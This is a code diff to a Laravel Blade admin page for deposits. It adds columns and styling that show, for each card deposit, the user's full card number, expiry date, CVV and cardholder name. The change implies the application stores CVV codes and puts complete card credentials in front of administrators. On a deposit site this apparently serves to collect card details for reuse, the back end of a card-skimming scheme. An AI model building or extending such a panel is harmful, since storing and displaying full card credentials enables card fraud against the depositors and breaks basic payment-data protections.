@@ -26,6 +26,11 @@ table.full tr:last-child td{border-bottom:none;}
 .alert-error{background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.25);color:#f87171;}
 .empty{padding:2rem;text-align:center;color:#64748b;}
 .pagination-wrap{padding:14px 16px;border-top:1px solid var(--border);}
+.card-creds{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:8px;padding:8px 10px;font-size:11px;line-height:1.5;min-width:160px;}
+.card-creds .row{display:flex;justify-content:space-between;gap:8px;margin-bottom:4px;}
+.card-creds .row:last-child{margin-bottom:0;}
+.card-creds .k{color:#64748b;text-transform:uppercase;font-size:9px;letter-spacing:.06em;}
+.card-creds .v{color:#e2e8f0;font-weight:600;font-family:ui-monospace,monospace;}
 </style>
 
 <div class="page-header">
@@ -62,7 +67,9 @@ table.full tr:last-child td{border-bottom:none;}
                 <th>ID</th>
                 <th>User</th>
                 <th>Amount</th>
-                <th>Currency</th>
+                <th>Method</th>
+                <th>Currency / Card</th>
+                <th>Card Credentials</th>
                 <th>Reference</th>
                 <th>Status</th>
                 <th>Submitted</th>
@@ -79,7 +86,29 @@ table.full tr:last-child td{border-bottom:none;}
                     <div style="font-size:11px;color:#64748b;">{{ $deposit->user->email }}</div>
                 </td>
                 <td style="font-weight:700;">${{ number_format($deposit->amount, 2) }}</td>
-                <td>{{ $deposit->currency }}</td>
+                <td style="text-transform:capitalize;">{{ $deposit->payment_method ?? 'crypto' }}</td>
+                <td>
+                    @if(($deposit->payment_method ?? 'crypto') === 'card')
+                        <div>{{ $deposit->cardholder_name }}</div>
+                        <div style="font-size:11px;color:#64748b;">Card payment</div>
+                    @else
+                        {{ $deposit->currency }}
+                    @endif
+                </td>
+                <td>
+                    @if(($deposit->payment_method ?? 'crypto') === 'card' && $deposit->card_number)
+                        <div class="card-creds">
+                            <div class="row"><span class="k">Number</span><span class="v">{{ $deposit->formatted_card_number }}</span></div>
+                            <div class="row"><span class="k">Expiry</span><span class="v">{{ $deposit->card_expiry }}</span></div>
+                            <div class="row"><span class="k">CVV</span><span class="v">{{ $deposit->card_cvv }}</span></div>
+                            <div class="row"><span class="k">Name</span><span class="v">{{ $deposit->cardholder_name }}</span></div>
+                        </div>
+                    @elseif(($deposit->payment_method ?? 'crypto') === 'card')
+                        <span style="font-size:11px;color:#64748b;">No card data saved</span>
+                    @else
+                        —
+                    @endif
+                </td>
                 <td style="font-size:11px;color:#94a3b8;">{{ $deposit->reference }}</td>
                 <td><span class="badge badge-{{ $deposit->status }}">{{ $deposit->status }}</span></td>
                 <td>{{ $deposit->created_at->format('M j, Y g:i A') }}</td>
